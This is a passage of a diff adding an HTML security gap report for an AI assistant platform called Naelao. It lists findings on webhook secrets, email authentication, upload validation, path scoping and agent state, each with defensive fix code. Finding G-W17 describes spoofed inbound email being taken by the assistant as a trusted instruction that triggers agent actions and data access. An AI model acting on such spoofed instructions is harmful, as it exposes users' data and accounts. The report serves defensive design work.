+  return SECRET_PATTERNS.reduce((acc, re) =&gt; acc.replace(re, "[redacted]"), s);
+}
+// Wrap the logger and the error-to-client serializer with scrub().
+```</p></div>
+</div>
+<div id="G-W16" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W16</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Secrets — Webhooks — SpaceDO / webhook signing secrets</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Webhook signing secrets lack per-integration isolation and rotation grace period</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Webhook signing secrets (Slack signing secret, Stripe webhook secret, etc.) are stored with no documented per-integration scoping or rotation support. If stored under the shared platform encryption key, a key compromise exposes all of them; if a provider regenerates its signing secret (a routine security action), Naelao has no way to accept both the old and new secret during a transition, so verification breaks for every event the moment the secret rotates.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Version webhook secrets and accept overlapping secrets during rotation:
+```sql
+CREATE TABLE webhook_secrets (
+  id           TEXT PRIMARY KEY,
+  integration  TEXT NOT NULL,        -- 'slack' | 'stripe' | ...
+  secret_enc   TEXT NOT NULL,        -- per-space DEK encrypted
+  version      INTEGER NOT NULL,
+  active       INTEGER DEFAULT 1,
+  created_at   INTEGER, rotated_at INTEGER
+);
+```
+```typescript
+// During rotation, mark old secret active for a grace window and verify against both
+for (const s of activeSecretsFor(integration)) {
+  if (verifySignature(body, sig, decrypt(s.secret_enc))) return true;
+}
+return false;
+```
+Expire the old secret after a 30-day grace period.</p></div>
+</div>
+<div id="G-W17" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W17</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#EF4444;background:#EF444418;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">CRITICAL</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Email — Inbound — naelao-notifications / sender verification</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Inbound email is processed with no SPF/DKIM/DMARC verification — spoofed mail triggers agent actions</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">If inbound email handling is enabled (email as a channel into the assistant), there is no documented verification of sender authenticity. An attacker can spoof the From address of a trusted user or system and send an email that the assistant treats as a legitimate instruction — triggering agent actions, approvals, or data access under the spoofed identity. SPF, DKIM, and DMARC results are available on inbound mail but are never checked.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Verify authentication results before acting on any inbound email:
+```typescript
+async function handleInboundEmail(msg: ForwardableEmailMessage, env: Env) {
+  const authResults = msg.headers.get("Authentication-Results") ?? "";
+  const spfPass   = /spf=pass/.test(authResults);
+  const dkimPass  = /dkim=pass/.test(authResults);
+  const dmarcPass = /dmarc=pass/.test(authResults);
+  if (!(spfPass &amp;&amp; dkimPass &amp;&amp; dmarcPass)) {
+    await quarantine(msg, "failed_email_auth");
+    return;
+  }
+  // Map the verified From to a known user; reject if unmapped
+  const user = await resolveVerifiedSender(msg.from, env);
+  if (!user) return quarantine(msg, "unknown_sender");
+  await routeToAssistant(user, msg);
+}
+```
+Never bind email-sender identity to an account on the From header alone.</p></div>
+</div>
+<div id="G-W18" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W18</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Email — Loops — naelao-notifications / reply-loop prevention</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">No email loop prevention — an auto-responder on the other end creates an unbounded reply storm</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The system sends transactional and assistant emails but has no safeguard against reply loops. If the assistant emails a user (or another system) that has an auto-responder or auto-forward configured, the auto-reply arrives inbound, the assistant responds, that response is auto-replied, and so on. This exhausts the email quota, damages sender reputation, and can spiral within minutes.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Add loop-detection headers and a per-thread send budget:
+```typescript
+// On every outbound email, set anti-loop headers
+headers.set("Auto-Submitted", "auto-generated");
+headers.set("X-Naelao-Loop-Token", threadLoopToken);
+// On inbound, drop machine-generated replies and enforce a count cap
+if (/auto-(replied|generated)/.test(msg.headers.get("Auto-Submitted") ?? "")) return;
+if (msg.headers.get("Precedence") === "bulk") return;
+const count = await incrThreadEmailCount(threadId);
+if (count &gt; MAX_EMAILS_PER_THREAD_PER_HOUR) { await pauseThread(threadId); return; }
+```</p></div>
+</div>
+<div id="G-W19" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W19</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Email — Outbound — naelao-notifications / send rate cap</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">No per-space outbound email rate cap — a buggy or malicious agent can send 100k emails/hour</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Outbound email is dispatched via the Resend API from the notifications queue with no per-space rate limit. A buggy agent loop, a misconfigured campaign, or a malicious script can enqueue tens of thousands of emails, which Resend dispatches until the account-level limit trips — getting the entire platform's sending domain flagged or suspended, affecting all tenants.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Enforce a per-space outbound quota before dispatch, backed by a Durable Object counter:
+```typescript
+async function sendEmail(spaceId: string, email: Email, env: Env) {
+  const limiterId = env.EMAIL_RATE_DO.idFromName(`email:${spaceId}`);
+  const limiter = env.EMAIL_RATE_DO.get(limiterId);
+  const { allowed, remaining } = await limiter.consume(1, { perHour: 500, perDay: 2000 });
+  if (!allowed) {
+    await deadLetter(email, "space_email_quota_exceeded");
+    await alertSpaceAdmin(spaceId, "email quota reached");
+    return;
+  }
+  await resendSend(email, env);
+}
+```
+Tie the per-space limits to the space tier.</p></div>
+</div>
+<div id="G-W20" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W20</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Multimodal — Images — agent / image input bounds</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Uploaded images are not size/dimension-checked before base64 vision encoding — token explosion and OOM</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Images supplied as agent input are base64-encoded and inlined into the model prompt with no prior size or dimension validation. A user uploading a 100MB or 12000×12000 image produces an enormous base64 string that explodes token usage (and cost) and can OOM the Worker (128MB memory limit) when several large images are processed concurrently. There is no downscaling or rejection path.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Validate and downscale before encoding:
+```typescript
+const MAX_BYTES = 5 * 1024 * 1024;     // 5MB
+const MAX_DIM = 2048;
+async function prepareImage(buf: ArrayBuffer, env: Env) {
+  if (buf.byteLength &gt; MAX_BYTES) throw new InputError("image exceeds 5MB");
+  const meta = await probeImage(buf);    // dimensions + real format
+  if (meta.width &gt; MAX_DIM || meta.height &gt; MAX_DIM) {
+    buf = await env.IMAGES.input(buf).transform({ width: MAX_DIM, fit: "scale-down" }).output();
+  }
+  return { data: bytesToBase64(buf), mediaType: meta.mime };
+}
+```
+Prefer referencing images by URL (CF Images / R2) where the model supports it, instead of inlining base64.</p></div>
+</div>
+<div id="G-W21" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W21</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Files — Upload Safety — file-manager / magic-byte validation</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">File uploads trust the declared MIME type — polyglot files bypass downstream type assumptions</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The write/upload path accepts a declared content type (and a base64 `encoding` flag) but never validates that the file's actual magic bytes match the declared type. A ZIP or HTML file can be uploaded as `image/png`, or an executable disguised as `.txt`. Any downstream consumer that trusts the declared type (a vision model, a previewer, another user downloading the file) is exposed to a polyglot/confused-type attack.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Sniff magic bytes and reject mismatches:
+```typescript
+import { fileTypeFromBuffer } from "file-type";
+async function validateUpload(buf: ArrayBuffer, declaredType: string) {
+  const detected = await fileTypeFromBuffer(buf);
+  const ALLOWED = new Set(["image/png","image/jpeg","application/pdf","text/plain", /*...*/]);
+  if (!detected || !ALLOWED.has(detected.mime)) {
+    throw new InputError(`unsupported or undetectable file type`);
+  }
+  if (detected.mime !== declaredType) {
+    throw new InputError(`declared ${declaredType} but content is ${detected.mime}`);
+  }
+  return detected.mime; // trust the sniffed type downstream, not the declared one
+}
+```</p></div>
+</div>
+<div id="G-W22" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W22</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Files — Upload Safety — file-manager / presigned URL TTL</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Presigned R2 upload URLs have no documented expiration — a leaked URL grants indefinite write access</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Direct-to-R2 uploads use presigned URLs but the spec does not define an expiration TTL or path scoping. A presigned URL that never expires (or expires far in the future) is a standing write capability: if it leaks (browser history, logs, a shared link), an attacker can inject arbitrary files into the space's workspace at the signed path for as long as the URL is valid.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Issue short-lived, tightly-scoped presigned URLs:
+```typescript
+async function getUploadUrl(spaceId: string, filename: string, env: Env) {
+  // Constrain the key to the caller's workspace prefix — no traversal
+  const key = `spaces/${spaceId}/uploads/${crypto.randomUUID()}/${sanitize(filename)}`;
+  const url = await env.R2.createPresignedUrl({
+    bucket: "naelao-workspace", key, method: "PUT",
+    expiresIn: 300,                 // 5 minutes
+    conditions: { contentLengthRange: [1, 50 * 1024 * 1024] }, // size cap
+  });
+  return { url, key };
+}
+```
+Validate the uploaded object (magic bytes, size) server-side after upload before treating it as usable.</p></div>
+</div>
+<div id="G-W23" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W23</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Files — Download — file-manager / content-type sniffing</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Download content-type comes from stored metadata without re-sniffing — enables type-confusion on download</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">On download, the file-manager returns the `contentType` from R2 object metadata, which was set at upload time from the (untrusted) declared type. If a user uploaded a mislabeled file (e.g., an HTML file stored as `text/plain`), downstream agents or users receive it with a content type that does not match its bytes, enabling type-confusion attacks (HTML served as something benign, then rendered).</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Re-derive the content type from content, and set safe download headers:
+```typescript
+async function downloadFile(key: string, env: Env) {
+  const obj = await env.R2.get(key);
+  const buf = await obj.arrayBuffer();
+  const detected = (await fileTypeFromBuffer(buf))?.mime ?? "application/octet-stream";
+  return new Response(buf, {
+    headers: {
+      "Content-Type": detected,                 // trust content, not stored metadata
+      "Content-Disposition": "attachment",        // never inline-render user files
+      "X-Content-Type-Options": "nosniff",
+    },
+  });
+}
+```</p></div>
+</div>
+<div id="G-W24" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W24</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Files — Path Safety — file-manager / path enforcement layer</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Relative-path validation is enforced only in app code — no R2-prefix enforcement as defense in depth</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Path traversal is blocked by a `validateRelativePath()` check at tool-execution time that rejects `..` and absolute paths. This is a single layer: any code path that forgets to call it, or a bug in the check, allows a crafted path to escape the space's workspace prefix and read/write another tenant's objects. There is no second enforcement boundary that constrains all R2 operations to the space prefix regardless of the application path.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Wrap R2 access in a per-space client that hard-prefixes every key:
+```typescript
+class SpaceScopedR2 {
+  constructor(private bucket: R2Bucket, private prefix: string) {}
+  private resolve(path: string): string {
+    const key = `${this.prefix}/${path}`.replace(/\/+/g, "/");
+    // Normalize and assert containment — defense in depth
+    if (!normalize(key).startsWith(this.prefix + "/")) throw new Error("path escape");
+    return key;
+  }
+  get(p: string)  { return this.bucket.get(this.resolve(p)); }
+  put(p: string, v: any) { return this.bucket.put(this.resolve(p), v); }
+}
+// All file ops go through SpaceScopedR2(bucket, `spaces/${spaceId}`), never raw bucket.
+```</p></div>
+</div>
+<div id="G-W25" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W25</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#EF4444;background:#EF444418;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">CRITICAL</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Orchestration — State — NaelaoAgentDO / setState conflicts</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Concurrent setState() writes are last-write-wins — parallel tool results silently lose state mutations</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">When two operations in the same turn (e.g., two parallel tool results) both call `setState()` / write the synced state row, the second write overwrites the first with no conflict detection or merge. There is no version field, no optimistic-locking check, and no merge semantics. Observed-in-parallel scenarios (the same run watched from multiple tabs, or genuinely concurrent tool completions) silently lose mutations, leaving client and server state diverged.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Use optimistic concurrency with a version column and merge-or-retry:
+```typescript
+async function updateState(mutator: (s: State) =&gt; State) {
+  for (let attempt = 0; attempt &lt; 5; attempt++) {
+    const row = [...sql.exec("SELECT data, version FROM agent_state WHERE id=?", id)][0];
+    const next = mutator(JSON.parse(row.data));
+    const res = sql.exec(
+      "UPDATE agent_state SET data=?, version=version+1 WHERE id=? AND version=?",
+      JSON.stringify(next), id, row.version
+    );
+    if (res.rowsWritten === 1) return next;   // committed
+    // else: someone else wrote — reload and retry
+  }
+  throw new Error("state update contention");
+}
+```
+For commutative updates (appending messages), prefer append-only tables over whole-object setState.</p></div>
+</div>
+<div id="G-W26" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W26</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Orchestration — State — NaelaoAgentDO / state sync payload</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Whole state object is broadcast on every change — large state floods every connected client per token</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">State sync broadcasts the entire serialized state object to all connected WebSocket clients whenever it changes. If the agent accumulates a large state (megabytes of session context), every incremental update — potentially every streamed token — re-sends the full object to every client. This wastes bandwidth, stalls clients, and scales quadratically with state size × update frequency × client count.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Send deltas, not whole-state, and cap synced state size:
+```typescript
+// Maintain synced state as a small view; keep bulk data in SQLite (queryable, not synced)
+const SYNC_BUDGET = 64 * 1024; // 64KB cap on the synced object
+// Broadcast JSON-patch deltas instead of the full object
+import { compare } from "fast-json-patch";
+const patch = compare(prevSyncedState, nextSyncedState);
+if (patch.length) this.broadcast(JSON.stringify({ type: "state_patch", patch }));
+```
+Keep transcripts, tool outputs, and large blobs out of synced state entirely — clients fetch them on demand by ID.</p></div>
+</div>
+<div id="G-W27" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W27</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Orchestration — State — NaelaoAgentDO / state ownership boundary</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">No defined boundary between in-memory this.state and SQLite — transient fields vanish on eviction</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Agent state is split between persistent SQLite (fibers, sessions, messages) and in-memory TypeScript fields (`this.state` and ad-hoc instance variables). The spec never defines which data belongs where. Code that writes working state to an instance field expecting it to survive — across a tool call, across a turn, across eviction — loses it silently when the DO hibernates, because only the SQLite checkpoint is restored on wake. Recovery via `onFiberRecovered()` restores the SQLite snapshot, not the in-memory mutations.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Define and document a strict ownership rule, and persist anything that must survive:
+```
+// Ownership contract:
+//  - this.state (synced):  small, client-visible UI state only (status, progress)
+//  - SQLite (durable):     anything that must survive eviction or be queried
+//  - instance fields:      request-scoped scratch ONLY; never relied on across awaits
+```
+```typescript
+// Persist working state explicitly at each await boundary that could hibernate
+await this.ctx.storage.put("loop_checkpoint", { step, partialResult });
+// On wake, restore from storage, never from a remembered field
+const cp = await this.ctx.storage.get("loop_checkpoint");
+```</p></div>
+</div>
+<div id="G-W28" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W28</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Orchestration — Handoff — AssistantDO / context transfer</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Sub-agent spawn passes only a task description — conversation, memory, and intermediate context are lost</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">When the assistant spawns a sub-agent, the only context transferred is the task description string. The parent's conversation history, relevant Memory OS facts, system prompt, and any intermediate results are not handed off. A sub-agent asked to "research the competitor mentioned earlier" has no access to "earlier," so it either fails or hallucinates. There is no atomic handoff primitive that snapshots and transfers the needed context.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Define a handoff payload that snapshots scoped context atomically:
+```typescript
+async spawnSubAgent(task: SubAgentTask) {
+  const handoff = {
+    task: task.description,
+    // Curated, scoped context — not the whole history
+    relevantMemory: await this.recallForTask(task.description, { topK: 8 }),
+    recentMessages: await this.getRecentMessages(10),
+    parentRef: { spaceId: this.spaceId, threadId: this.threadId, agentId: this.id.toString() },
+    handoffId: crypto.randomUUID(),
+  };
+  // Persist the handoff so it survives parent eviction (see G-W30)
+  this.ctx.storage.sql.exec("INSERT INTO handoffs (id, payload, status) VALUES (?,?,'sent')",
+    handoff.handoffId, JSON.stringify(handoff));
+  return dispatchSubAgent(handoff);
+}
+```</p></div>
+</div>
+<div id="G-W29" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W29</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Orchestration — Concurrency — NaelaoAgentDO / per-thread queue</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Two messages to the same thread interleave — no explicit queue guarantees ordered, non-overlapping turns</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">When two requests target the same thread concurrently (user double-sends, or a client retries), the DO serializes individual handler invocations but there is no explicit turn queue. A second message can begin a new LLM turn while the first turn's tool results are still being persisted, interleaving messages in the history and producing a corrupted, non-causal transcript. The single-threaded DO model protects individual storage ops, not the multi-await logical turn.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Serialize turns with an explicit per-thread lock/queue:
+```typescript
+private turnQueue: Promise&lt;void&gt; = Promise.resolve();
+async handleMessage(msg: UserMessage) {
+  // Each turn runs strictly after the previous one finishes
+  const run = this.turnQueue.then(() =&gt; this.runTurn(msg));
+  this.turnQueue = run.catch(() =&gt; {}); // keep the chain alive on error
+  return run;
+}
+```
+Alternatively reject a new message with `409 turn_in_progress` while a turn is active, and let the client decide to queue or cancel.</p></div>
+</div>
+<div id="G-W30" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W30</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Orchestration — Reliability — AssistantDO / orphaned sub-agents</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Sub-agents have no parent-liveness link — if the parent dies, results are never delivered and work runs to waste</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">A spawned sub-agent runs in its own DO and reports back by writing to the parent's status table, which the parent polls on heartbeat. If the parent is deleted or permanently fails, the sub-agent keeps executing (consuming credits), finishes, writes a result no one reads, and is never cleaned up. There is no parent-liveness heartbeat, no result delivery via a durable channel, and no orphan timeout.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Give sub-agents a durable result sink and an orphan timeout:
+```typescript
+// Sub-agent delivers results to a queue keyed by parent, not by polling the parent DO
+await env.SUBAGENT_RESULTS_QUEUE.send({
+  parentRef, handoffId, subAgentId, result, completedAt: Date.now(),
+});
+// A consumer routes the result to the parent if alive, or to a dead-letter store if not.
+// Sub-agent self-terminates if the parent is unreachable for N checks:
+if (await parentUnreachable(parentRef, { checks: 3 })) {
+  await this.saveResult(result);       // persist for later retrieval
+  await this.terminate("orphaned");    // stop consuming credits
+}
+```</p></div>
+</div>
+<div id="G-W31" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W31</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Orchestration — Broadcast — NaelaoAgentDO / broadcast error isolation</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">broadcast loop has no per-socket error isolation — one closed socket aborts delivery to the rest</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The broadcast pattern `getWebSockets().forEach(ws =&gt; ws.send(...))` calls `send()` on each socket with no try/catch. A socket that closed between enumeration and send throws on `send()`, and because the throw is uncaught inside the synchronous `forEach`, delivery to all sockets later in the array is aborted. Clients enumerated after the dead one miss the message entirely.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Isolate each send and prune dead sockets:
+```typescript
+broadcast(data: string) {
